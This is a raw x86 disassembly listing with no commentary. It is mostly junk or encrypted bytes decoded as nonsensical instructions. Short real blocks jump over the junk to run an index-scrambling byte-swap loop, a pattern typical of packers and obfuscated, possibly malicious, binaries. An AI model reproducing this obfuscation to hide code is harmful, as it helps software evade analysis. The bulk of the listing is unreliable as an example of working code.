  40847e:	je     0x408467
  408480:	addr16 inc edx
  408482:	cmc    
  408483:	aad    0x86
  408485:	xchg   BYTE PTR [eax],bh
  408487:	xchg   ah,bl
  408489:	inc    edx
  40848a:	lds    ecx,FWORD PTR [edx]
  40848c:	push   esi
  40848d:	sahf   
  40848e:	jp     0x4084ee
  408490:	or     BYTE PTR [esi-0x59],0x62
  408494:	inc    ebx
  408495:	in     al,dx
  408496:	mov    BYTE PTR [edi+0x7],bh
  408499:	xor    BYTE PTR [ecx-0x41],al
  40849c:	jo     0x408500
  40849e:	cld    
  40849f:	xor    BYTE PTR [edi],bl
  4084a1:	pop    eax
  4084a2:	push   ds
  4084a3:	mov    ecx,0xe9f6ae86
  4084a8:	or     dl,BYTE PTR [ebx-0x8]
  4084ab:	retf   0xa26c
  4084ae:	pusha  
  4084af:	in     al,dx
  4084b0:	fdiv   QWORD PTR [esi+eiz*1+0x3c]
  4084b4:	daa    
  4084b5:	fimul  WORD PTR [ecx]
  4084b7:	xchg   ecx,eax
  4084b8:	add    eax,0xf06cbba8
  4084bd:	mov    ebp,ebp
  4084bf:	ss cwde 
  4084c1:	mov    esp,0x5e1af776
  4084c6:	xchg   edx,eax
  4084c7:	inc    edi
  4084c8:	enter  0xbf57,0x7f
  4084cc:	iret   
  4084cd:	dec    edi
  4084ce:	adc    dh,BYTE PTR [esi]
  4084d0:	mov    dl,0xe4
  4084d2:	or     BYTE PTR [eax+0x54],cl
  4084d5:	inc    edi
  4084d6:	(bad)  
  4084d7:	pop    ss
  4084d8:	mov    es,WORD PTR [ebx+0x9]
  4084db:	ins    DWORD PTR es:[edi],dx
  4084dc:	neg    DWORD PTR [esi]
  4084de:	pop    DWORD PTR [ebp+0xef9038c]
  4084e4:	ins    DWORD PTR es:[edi],dx
  4084e5:	loope  0x40855b
  4084e7:	xchg   ebp,eax
  4084e8:	adc    ebp,ebp
  4084ea:	imul   esp,edx,0xcf2cce43
  4084f0:	ja     0x40850c
  4084f2:	adc    al,0x28
  4084f4:	jle    0x408550
  4084f6:	dec    edi
  4084f7:	jae    0x4084d9
  4084f9:	push   eax
  4084fa:	mov    ?,edx
  4084fc:	pop    eax
  4084fd:	icebp  
  4084fe:	push   esp
  4084ff:	lea    ebx,[esi-0x10]
  408502:	fstp   DWORD PTR [edx]
  408504:	sbb    BYTE PTR [eax+0x3a],cl
  408507:	cwde   
  408508:	adc    BYTE PTR [ebx],bl
  40850a:	xlat   BYTE PTR ds:[ebx]
  40850b:	jb     0x4084a8
  40850d:	xchg   esi,eax
  40850e:	ins    DWORD PTR es:[edi],dx
  40850f:	xor    BYTE PTR [eax+eax*2+0x10821a09],cl
  408516:	adc    ch,BYTE PTR [esi]
  408518:	mov    eax,DWORD PTR [ebx+0x71]
  40851b:	lock rep lods eax,DWORD PTR ds:[esi]
  40851e:	fimul  WORD PTR [edi]
  408520:	dec    edi
  408521:	push   ebp
  408522:	lds    ebp,FWORD PTR [ecx]
  408524:	fucompp 
  408526:	sub    DWORD PTR [ebp-0x7a7f0d42],0xba093cce
  408530:	sub    cl,al
  408532:	jae    0x4085ad
  408534:	push   ss
  408535:	adc    al,ch
  408537:	cmp    BYTE PTR [ecx+0x5e442686],ah
  40853d:	adc    esp,ecx
  40853f:	test   BYTE PTR [esi],ch
  408541:	push   ebp
  408542:	jmp    0xd179ac22
  408547:	lods   al,BYTE PTR ds:[esi]
  408548:	dec    ebx
  408549:	imul   edi,DWORD PTR [edi-0x62],0x4046dc74
  408550:	xchg   BYTE PTR [ebx+0x3c],dl
  408553:	nop
  408554:	add    esp,DWORD PTR [esi-0x709a8452]
  40855a:	fs retf 0x3302
  40855e:	xor    eax,0xc3fe9f0
  408563:	mov    esp,0xb343047b
  408568:	push   ebp
  408569:	not    dl
  40856b:	xchg   ebx,eax
  40856c:	sbb    bl,bh
  40856e:	ss std 
  408570:	mov    bh,0xb0
  408572:	aaa    
  408573:	test   al,cl
  408575:	clc    
  408576:	shl    DWORD PTR [edi-0x61c8888e],cl
  40857c:	jmp    0xc1f3:0x48fe47b1
  408583:	(bad)  
  408585:	aad    0xc1
  408587:	icebp  
  408588:	cmp    ebx,edx
  40858a:	ja     0x408598
  408590:	mov    edx,DWORD PTR [ebp-0x34]
  408593:	jmp    0x408770
  408598:	mov    edx,DWORD PTR [ebp-0x3c]
  40859b:	mov    edi,DWORD PTR [ebp-0x4]
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0x9e13353f
  4085c4:	retf   
  4085c5:	or     cl,ah
  4085c7:	xlat   BYTE PTR ds:[ebx]
  4085c8:	jle    0x408648
  4085ca:	mov    bh,BYTE PTR [edi+0x7e]
  4085cd:	jle    0x4085a7
  4085cf:	cld    
  4085d0:	out    dx,al
  4085d1:	push   eax
  4085d2:	and    ch,BYTE PTR es:[edi+eax*1-0x2]
  4085d7:	inc    eax
  4085d8:	stos   BYTE PTR es:[edi],al
  4085d9:	nop
  4085da:	add    al,0xb
  4085dc:	sar    DWORD PTR [esi],0x9a
  4085df:	mov    esi,0x350b1592
  4085e4:	fcom   DWORD PTR [edx+eiz*1+0x7c]
  4085e8:	out    dx,eax
  4085e9:	call   0xc2c4:0x10893ce6
  4085f0:	call   0x611e8441
  4085f5:	xor    DWORD PTR [esi-0x4d],esp
  4085f8:	xchg   BYTE PTR [ecx-0x35903b1b],dl
  4085fe:	mov    esp,0xde3eccc2
  408603:	out    0x59,eax
  408605:	jle    0x40866b
  408607:	out    dx,eax
  408608:	mov    ds:0x58b70acc,al
  40860e:	dec    eax
  40860f:	cmp    DWORD PTR [esi+0x7af5e595],edi
  408615:	mov    ds:0x6f81c126,eax
  40861a:	and    BYTE PTR [eax],cl
  40861c:	sub    al,BYTE PTR [ecx]
  40861e:	dec    edx
  40861f:	imul   ecx,esi,0xab0b45ec
  408625:	popf   
  408626:	pop    ecx
  408627:	inc    ecx
  408628:	adc    DWORD PTR [edi-0x30],edx
  40862b:	mov    DWORD PTR [esi+0x65],ebp
  40862e:	xchg   WORD PTR [ebp-0x7d],bp
  408632:	sub    bl,BYTE PTR [edx+0x17]
  408635:	dec    ebx
  408636:	mov    al,0xf1
  408638:	stos   DWORD PTR es:[edi],eax
  408639:	sbb    dh,BYTE PTR [esi+0x22]
  40863c:	inc    esi
  40863d:	arpl   WORD PTR [ebp+eiz*4-0x62],dx
  408641:	jge    0x408616
  408643:	call   0x7cab:0xd452407
  40864a:	mov    ebp,ss
  40864c:	data16 and BYTE PTR [edi],bl
  40864f:	xor    ch,ch
  408651:	jns    0x4085e8
  408653:	cmp    dl,BYTE PTR [ecx+0x12]
  408656:	bound  eax,QWORD PTR ds:0xf566cac9
  40865c:	cmc    
  40865d:	lock adc DWORD PTR [edi+0x3b],ecx
  408661:	or     ch,BYTE PTR [esi]
  408663:	call   0x29f3:0x8a6c903a
  40866a:	or     cl,BYTE PTR [ecx+0x4a]
  40866d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40866e:	push   ecx
  40866f:	data16 out dx,al
  408671:	xchg   ebx,eax
  408672:	in     al,0x6f
  408674:	adc    al,0xb8
  408676:	lock mov ds:0x6a13d984,eax
  40867c:	xchg   edi,eax
  40867d:	out    dx,eax
  40867e:	xchg   esp,eax
  40867f:	inc    edi
  408680:	mov    eax,ds:0xdcddedb7
  408685:	aad    0xd3
  408687:	xlat   BYTE PTR ds:[ebx]
  408688:	push   edx
  408689:	sti    
  40868a:	out    dx,eax
  40868b:	je     0x4086d6
  40868d:	jbe    0x40866f
  40868f:	mov    esi,0xdd0391b2
  408694:	(bad)  
  408695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408696:	jnp    0x408685
  408698:	dec    eax
  408699:	call   0x283757e5
  40869e:	gs out 0xf8,eax
  4086a1:	add    ebx,ebp
  4086a3:	and    dl,BYTE PTR [ebx-0x2d]
  4086a6:	xchg   ebp,eax
  4086a7:	push   0xa7ad26f0
  4086ac:	pop    ecx
  4086ad:	ror    esp,0x83
  4086b0:	dec    edi
  4086b1:	popf   
  4086b2:	mov    bl,0x6d
  4086b4:	shr    BYTE PTR [edx-0x142f5da2],cl
  4086ba:	test   edi,ebp
  4086bc:	outs   dx,DWORD PTR ds:[esi]
  4086bd:	sub    dl,dh
  4086bf:	sub    ecx,DWORD PTR [edx]
  4086c1:	lock mov edx,0x98245d1d
  4086c7:	xor    dh,al
  4086c9:	mov    ebp,0x48f43919
  4086ce:	mov    esp,0x92a1a7d2
  4086d3:	push   eax
  4086d4:	xor    ebp,DWORD PTR [ebx]
  4086d6:	inc    edx
  4086d7:	xor    ch,0xea
  4086da:	ficomp DWORD PTR [esi+0x5c1129d5]
  4086e0:	rcr    BYTE PTR [ebx],1
  4086e2:	jno    0x4086dd
  4086e4:	inc    ecx
  4086e5:	jmp    0x8bf7:0xc19cfcc1
  4086ec:	scas   eax,DWORD PTR es:[edi]
  4086ed:	ins    BYTE PTR es:[edi],dx
  4086ee:	test   DWORD PTR [ebx+edi*8+0x762f9b05],esi
  4086f5:	dec    ebp
  4086f6:	sub    esi,ebx
  4086f8:	jae    0x408712
  4086fa:	je     0x4086d8
  4086fc:	xchg   ecx,eax
  4086fd:	mov    dl,0xc0
  4086ff:	mov    al,0x67
  408701:	cdq    
  408702:	push   es
  408703:	enter  0x74e8,0x8d
  408707:	stc    
  408708:	xor    esp,DWORD PTR [esi]
  40870a:	pop    ds
  40870b:	xchg   BYTE PTR [edx+0x7c],ch
  40870e:	add    ah,ah
  408710:	sbb    eax,DWORD PTR [esi+0x26]
  408713:	pop    ebp
  408714:	repz cmp dl,BYTE PTR [eax+0x62]
  408718:	xor    DWORD PTR [eax],ecx
  40871a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40871b:	inc    edi
  40871c:	sub    al,0x4a
  40871e:	add    al,0xcd
  408720:	std    
  408721:	mov    ecx,0xc73bba87
  408726:	adc    eax,0x6c05656a
  40872b:	in     al,0xec
  40872d:	jmp    0xa79351db
  408732:	arpl   WORD PTR [ebx+ecx*2+0x790f9b32],bp
  408739:	mov    edi,0x1d41bdad
  40873e:	out    0xb0,eax
  408740:	mov    cl,0x54
  408742:	test   bl,ch
  408744:	(bad)  
  408745:	loop   0x40871c
  408747:	push   eax
  408748:	jmp    0xea61:0xdfe635e8
  40874f:	aam    0xb5
  408751:	inc    BYTE PTR [eax-0x3a399a2e]
  408757:	push   ebp
  408758:	mov    ?,WORD PTR [esi]
  40875a:	inc    edx
  40875b:	pop    edx
  40875c:	lahf   
  40875d:	ds cmp ch,bh
  408760:	sahf   
  408761:	lds    edi,FWORD PTR [ebx]
  408763:	fimul  DWORD PTR [ebx-0x79f037ab]
  408769:	add    eax,DWORD PTR [eax]
  40876b:	add    BYTE PTR [eax],al
  40876d:	mov    edx,DWORD PTR [ebp-0x3c]
  408770:	mov    edi,DWORD PTR [ebp-0x4]
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	out    0x29,eax
  408849:	xchg   edi,eax
  40884a:	push   ecx
  40884b:	jge    0x408822
  40884d:	jle    0x4088cd
  40884f:	mov    bh,BYTE PTR [edi+0x7e]
  408852:	jle    0x4088aa
  408854:	mov    ebx,0x37abc65b
  408859:	mov    edi,0xb7e66f90
  40885e:	cwde   
  40885f:	out    dx,al
  408860:	js     0x4088bf
  408862:	dec    ebx
  408863:	push   edx
  408864:	and    BYTE PTR [eax-0x57],0xa5
  408868:	in     al,0x22
  40886a:	mov    ebx,0xe3aa066c
  40886f:	dec    edi
  408870:	fisub  DWORD PTR [edx+0x6c]
  408873:	adc    dh,BYTE PTR [esi-0x1d58b6b0]
  408879:	(bad)  
  40887a:	test   DWORD PTR [edx],0xab701920
  408880:	repz xor eax,0x8037bf20
  408886:	adc    eax,0x8a798a40
  40888b:	lods   al,BYTE PTR ds:[esi]
  40888c:	sar    DWORD PTR [edi+0x4d2fafc2],0x54
  408893:	sub    eax,0x950fb494
  408898:	data16 das 
  40889a:	mov    dh,0xc9
  40889c:	(bad)
  40889f:	jg     0x408882
  4088a1:	test   BYTE PTR [eax-0x1242f5b1],bh
  4088a7:	cmp    eax,0x4acf9b5f
  4088ac:	xor    eax,0xcf932642
  4088b1:	js     0x40884c
  4088b3:	push   eax
  4088b4:	fsub   QWORD PTR [esp+eiz*8]
  4088b7:	jmp    0xf26d5ce3
  4088bc:	xor    al,0xd1
  4088be:	jmp    FWORD PTR [eax+edi*1+0x38fb2587]
  4088c5:	inc    eax
  4088c6:	ud1    edi,esi
  4088c9:	mov    al,0xa3
  4088cb:	push   0xffffffe0
  4088cd:	pushf  
  4088ce:	cmp    eax,0xe835bb23
  4088d3:	ins    DWORD PTR es:[edi],dx
  4088d4:	add    BYTE PTR [ebp+0x7],0xc1
  4088d8:	std    
  4088d9:	push   esi
  4088da:	jo     0x4088dc
  4088dc:	test   BYTE PTR [ecx+0x7a],ch
  4088df:	mov    eax,0xc3569491
  4088e4:	cmp    eax,0x31aaec7a
  4088e9:	outs   dx,DWORD PTR ds:[esi]
  4088ea:	fstp   TBYTE PTR [ecx]
  4088ec:	xchg   ecx,eax
  4088ed:	sub    esp,esi
  4088ef:	arpl   dx,cx
  4088f1:	inc    edi
  4088f2:	jp     0x4088b7
  4088f4:	in     eax,0x82
  4088f6:	pop    ebp
  4088f7:	test   DWORD PTR [ebx+0x164280fa],esi
  4088fd:	inc    edx
  4088fe:	add    al,0x5d
  408900:	sub    ebp,esp
  408902:	pop    ebp
  408903:	mov    eax,0xc7f18b68
  408908:	pushf  
  408909:	jge    0x40889f
  40890b:	bound  esi,QWORD PTR [ecx+ebp*1-0x1714d153]
  408912:	and    edx,DWORD PTR [eax+0x4ccd5d38]
  408918:	mov    al,ds:0x31e65711
  40891d:	das    
  40891e:	jmp    0xd20e519d
  408923:	xor    DWORD PTR [edi-0x380dabf8],ebx
  408929:	xchg   esi,eax
  40892a:	push   es
  40892b:	repz xor eax,0x35e9f2a1
  408931:	sub    esp,esi
  408933:	pusha  
  408934:	mov    ds:0xe3df463a,al
  408939:	push   0xacd267a6
  40893e:	mov    es,WORD PTR [eax]
  408940:	sub    bl,BYTE PTR [esi-0x3c]
  408943:	in     eax,0xe5
  408945:	lods   eax,DWORD PTR ds:[esi]
  408946:	adc    BYTE PTR [ecx+0x19],bh
  408949:	pushf  
  40894a:	imul   ecx,DWORD PTR [edx-0x44],0x6b9945ba
  408951:	inc    ebx
  408952:	push   es
  408953:	push   ds
  408954:	scas   eax,DWORD PTR es:[edi]
  408955:	mov    ebp,0x436202b9
  40895a:	pusha  
  40895b:	dec    esp
  40895c:	cmp    DWORD PTR [esp+edx*4],eax
  40895f:	sbb    al,0xf7
  408961:	stos   DWORD PTR es:[edi],eax
  408962:	rcr    BYTE PTR [ebx+0x43a20928],cl
  408968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408969:	cs sub eax,0xd5a6f8ca
  40896f:	add    BYTE PTR [eax+0x38],ch
  408972:	cwde   
  408973:	sub    BYTE PTR [edx+edx*8-0x7d],ch
  408977:	outs   dx,DWORD PTR ds:[esi]
  408978:	rcr    BYTE PTR [eax-0x7b],1
  40897b:	pop    esp
  40897c:	ja     0x408930
  40897e:	xor    bl,ch
  408980:	adc    esp,ebx
  408982:	clc    
  408983:	out    0x91,al
  408985:	xchg   esi,eax
  408986:	dec    eax
  408987:	add    BYTE PTR [ebp-0x72],ch
  40898a:	sbb    ebp,esi
  40898c:	loopne 0x408972
  40898e:	and    edi,DWORD PTR [ebx]
  408990:	mov    WORD PTR [ecx-0xdc6d087],fs
  408996:	xchg   edx,eax
  408997:	pushf  
  408998:	call   0xd24b3c05
  40899d:	std    
  40899e:	xor    DWORD PTR [ecx+0x70],ecx
  4089a1:	push   edi
  4089a2:	jmp    FWORD PTR [ebp-0x35]
  4089a5:	push   cs
  4089a6:	out    dx,eax
  4089a7:	jmp    0x8dca:0xd1a5b556
  4089ae:	iret   
  4089af:	push   esp
  4089b0:	inc    edi
  4089b1:	add    ebx,edx
  4089b3:	(bad)  
  4089b4:	adc    eax,0x1393dec4
  4089b9:	or     al,BYTE PTR [ebx]
  4089bb:	clc    
  4089bc:	add    ah,BYTE PTR [edi-0x5dc1e594]
  4089c2:	mov    esi,0xe93e8018
  4089c7:	push   ebx
  4089c8:	jbe    0x408a0d
  4089ca:	test   eax,0x2d6d2f6c
  4089cf:	sbb    al,0x25
  4089d1:	arpl   sp,bp
  4089d3:	call   0x13a1:0xa1f517e8
  4089da:	push   0x51
  4089dc:	push   cs
  4089dd:	pop    edx
  4089de:	dec    esi
  4089df:	cpuid  
  4089e1:	inc    BYTE PTR [edi]
  4089e3:	push   cs
  4089e4:	and    esi,ebx
  4089e6:	cmp    eax,0xf903f833
  4089eb:	imul   edi,ebx
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	cmp    bl,BYTE PTR [eax-0x2c]
  408a09:	test   BYTE PTR [ecx-0x7581812e],0x7f
  408a10:	jle    0x408a90
  408a12:	push   ebp
  408a13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a14:	call   0x6bd7b250
  408a19:	pop    edx
  408a1a:	test   al,0x21
  408a1c:	adc    esi,DWORD PTR [edx-0xf8b6b2a]
  408a22:	les    edx,FWORD PTR [edx-0x314d0f26]
  408a28:	test   al,0x0
  408a2a:	mov    edi,0x5316292f
  408a2f:	push   ebx
  408a30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a31:	gs not dl
  408a34:	push   es
  408a35:	pusha  
  408a36:	sub    DWORD PTR [ebp+0x4a86440d],eax
  408a3c:	sar    DWORD PTR [esi+eax*4+0x838b5be],0xf2
  408a44:	sub    eax,0xddfd0374
  408a49:	pop    DWORD PTR [eax-0x5970df67]
  408a4f:	mov    ch,0x57
  408a51:	(bad)  
  408a52:	xor    al,0x58
  408a54:	pop    ss
  408a55:	ss push ecx
  408a57:	loope  0x408a2f
  408a59:	mov    esi,0x7e4277ad
  408a5e:	xchg   ebp,eax
  408a5f:	dec    esi
  408a60:	retf   0xacd3
  408a63:	xor    bl,BYTE PTR ds:0x6762429f
  408a69:	test   eax,0x91043494
  408a6e:	mov    esp,0x5672bef6
  408a73:	mov    esp,0xe695ea36
  408a78:	cmp    eax,DWORD PTR [eax]
  408a7a:	imul   BYTE PTR [eax-0x7d]
  408a7d:	sbb    esi,edx
  408a7f:	(bad)  
  408a80:	xchg   edi,eax
  408a81:	and    DWORD PTR [esi],edx
  408a83:	stc    
  408a84:	jbe    0x408a3d
  408a86:	add    eax,0xe135d29c
  408a8b:	enter  0x592c,0xc
  408a8f:	sub    cl,ah
  408a91:	or     BYTE PTR [esi+ebp*1+0x6f],ah
  408a95:	rol    eax,1
  408a97:	(bad)  
  408a98:	hlt    
  408a99:	loop   0x408a3d
  408a9b:	mov    ah,0x28
  408a9d:	push   ebx
  408a9e:	std    
  408a9f:	sahf   
  408aa0:	loope  0x408a44
  408aa2:	aaa    
  408aa3:	jmp    0x408afa
  408aa5:	mov    BYTE PTR [eax],bh
  408aa7:	shr    DWORD PTR [edx+0x3e],1
  408aaa:	cmp    ch,0xf3
  408aad:	or     bh,dl
  408aaf:	sbb    ebx,ebp
  408ab1:	lods   al,BYTE PTR ds:[esi]
  408ab2:	in     eax,0x5d
  408ab4:	push   edx
  408ab5:	sub    ch,BYTE PTR [ecx]
  408ab7:	mov    ebp,0x732ae114
  408abc:	mov    ebx,0xc6d6ad3c
  408ac1:	cs int3 
  408ac3:	jo     0x408ad1
  408ac5:	cwde   
  408ac6:	xchg   ebp,eax
  408ac7:	jg     0x408b3d
  408ac9:	push   ss
  408aca:	xor    DWORD PTR [eax],0x566bf300
  408ad0:	out    dx,eax
  408ad1:	stc    
  408ad2:	jns    0x408afd
  408ad4:	test   edx,ebp
  408ad6:	ret    0x68f1
  408ad9:	mov    BYTE PTR [ebx+0x4],ch
  408adc:	mov    edi,DWORD PTR [ecx+0x6a1228ce]
  408ae2:	in     al,dx
  408ae3:	clc    
  408ae4:	xchg   ebx,ebx
  408ae6:	pushf  
  408ae7:	(bad)  
  408ae8:	icebp  
  408ae9:	mov    esi,0x46c8051d
  408aee:	push   ebp
  408aef:	popf   
  408af0:	call   0xc238ca21
  408af5:	jg     0x408ab7
  408af7:	lds    ebx,FWORD PTR [eax]
  408af9:	inc    DWORD PTR [ecx+0x52]
  408afc:	mov    al,ds:0x909428a6
  408b01:	push   eax
  408b02:	push   ebx
  408b03:	in     eax,0x39
  408b05:	(bad)  
  408b06:	inc    bh
  408b08:	mov    fs,WORD PTR [edi+0x7a]
  408b0b:	or     DWORD PTR [eax],ebx
  408b0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b0e:	or     al,0x41
  408b10:	loope  0x408ae8
  408b12:	in     al,0xec
  408b14:	push   0xaeab5059
  408b19:	push   ecx
  408b1a:	push   ds
  408b1b:	add    edx,DWORD PTR [ecx]
  408b1d:	dec    ecx
  408b1e:	in     al,0x93
  408b20:	fidivr WORD PTR [edi+edx*8+0x7b]
  408b24:	adc    eax,0x9641dab
  408b29:	sub    al,0xfb
  408b2b:	test   DWORD PTR [esi-0x5d],esi
  408b2e:	not    eax
  408b30:	nop
  408b31:	call   0xd481461a
  408b36:	mov    WORD PTR [esi],es
  408b38:	(bad)  
  408b39:	push   ebp
  408b3a:	dec    edx
  408b3b:	xor    BYTE PTR [edi-0x77],al
  408b3e:	push   edx
  408b3f:	ds ds paddd mm5,mm1
  408b44:	inc    edi
  408b45:	jb     0x408b0d
  408b47:	mov    esp,0x26754e8a
  408b4c:	pop    edi
  408b4d:	pop    esi
  408b4e:	dec    ebx
  408b4f:	push   esp
  408b50:	popf   
  408b51:	ret    
  408b52:	mov    eax,ds:0xedf1ff92
  408b57:	(bad)
  408b5a:	es mov edx,0xeb5d0198
  408b60:	popa   
  408b61:	sahf   
  408b62:	jmp    0x5554:0x81e53416
  408b69:	xor    eax,0xaf80522a
  408b6e:	xchg   ebp,eax
  408b6f:	fstp   QWORD PTR [edx-0x67]
  408b72:	xchg   esp,eax
  408b73:	pop    ds
  408b74:	push   ebp
  408b75:	xor    eax,0xd02010f1
  408b7a:	push   cs
  408b7b:	jmp    0x37cda363
  408b80:	push   esi
  408b81:	repz xchg esp,eax
  408b83:	sbb    edx,ecx
  408b85:	scas   eax,DWORD PTR es:[edi]
  408b86:	adc    eax,DWORD PTR [edx-0x62]
  408b89:	test   BYTE PTR [esi],0xa0
  408b8c:	jne    0x408b7c
  408b8e:	push   eax
  408b8f:	cmp    DWORD PTR [ecx+0x52a6ff66],esp
  408b95:	stc    
  408b96:	mov    dh,al
  408b98:	fwait
  408b99:	lahf   
  408b9a:	sbb    BYTE PTR [ecx+0x50],0x2b
  408b9e:	mov    dh,0xad
  408ba0:	push   esp
  408ba1:	jbe    0x408b48
  408ba3:	jp     0x408bd1
  408ba5:	xor    cl,BYTE PTR [ebp+0x729b1fbc]
  408bab:	xor    al,BYTE PTR [eax]
  408bad:	cmp    edi,edx
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	jge    0x408b86
  408bda:	pop    es
  408bdb:	mov    esi,0x7e7ed025
  408be0:	mov    bh,BYTE PTR [edi+0x7e]
  408be3:	jle    0x408c4d
  408be5:	in     al,0x15
  408be7:	mov    dl,0x17
  408be9:	mov    bl,0xf5
  408beb:	test   DWORD PTR ds:0x912b649a,edi
  408bf1:	lea    edi,[ebx]
  408bf3:	fucomip st,st(4)
  408bf5:	stc    
  408bf6:	sbb    dl,BYTE PTR [ebp-0x4e]
  408bf9:	jmp    0x7c31:0xee67b70b
  408c00:	pop    ss
  408c01:	call   0xb062:0x8ba34327
  408c08:	loop   0x408c25
  408c0a:	jge    0x408c04
  408c0c:	add    eax,0xa64992af
  408c11:	repz in eax,dx
  408c13:	jb     0x408c6d
  408c15:	xchg   ebx,eax
  408c16:	in     al,0xef
  408c18:	stc    
  408c19:	mov    ah,0x4a
  408c1b:	push   ebp
  408c1c:	nop
  408c1d:	and    eax,0x3031dfa5
  408c22:	fisubr DWORD PTR [edi-0xb0275f6]
  408c28:	outs   dx,BYTE PTR ds:[esi]
  408c29:	pop    esp
  408c2a:	jnp    0x408c13
  408c2c:	pop    ss
  408c2d:	loopne 0x408c3e
  408c2f:	xor    dl,BYTE PTR [ebx]
  408c31:	mov    ebx,0x1529347
  408c36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c37:	pop    ebx
  408c38:	scas   eax,DWORD PTR es:[edi]
  408c39:	mov    al,ds:0x7b6d67c8
  408c3e:	fld    QWORD PTR [esp+eax*2]
  408c41:	sub    ebx,DWORD PTR [ecx]
  408c43:	jb     0x408c8d
  408c45:	pushf  
  408c46:	ffree  st(1)
  408c48:	shr    DWORD PTR [ecx+0xd86870a],cl
  408c4e:	enter  0x519c,0x5b
  408c52:	out    dx,al
  408c53:	dec    ebp
  408c54:	mov    bh,0xf2
  408c56:	stos   DWORD PTR es:[edi],eax
  408c57:	inc    edi
  408c58:	xchg   edi,eax
  408c59:	dec    edi
  408c5a:	sti    
  408c5b:	into   
  408c5c:	jle    0x408cbc
  408c5e:	push   ecx
  408c5f:	cmp    eax,0x373623ed
  408c64:	lahf   
  408c65:	aaa    
  408c66:	mov    ds:0xc02a04de,eax
  408c6b:	and    eax,DWORD PTR [ebp+0x9]
  408c6e:	mov    DWORD PTR [eax+0x64ff6853],esi
  408c74:	pop    ecx
  408c75:	and    DWORD PTR [edi],edx
  408c77:	hlt    
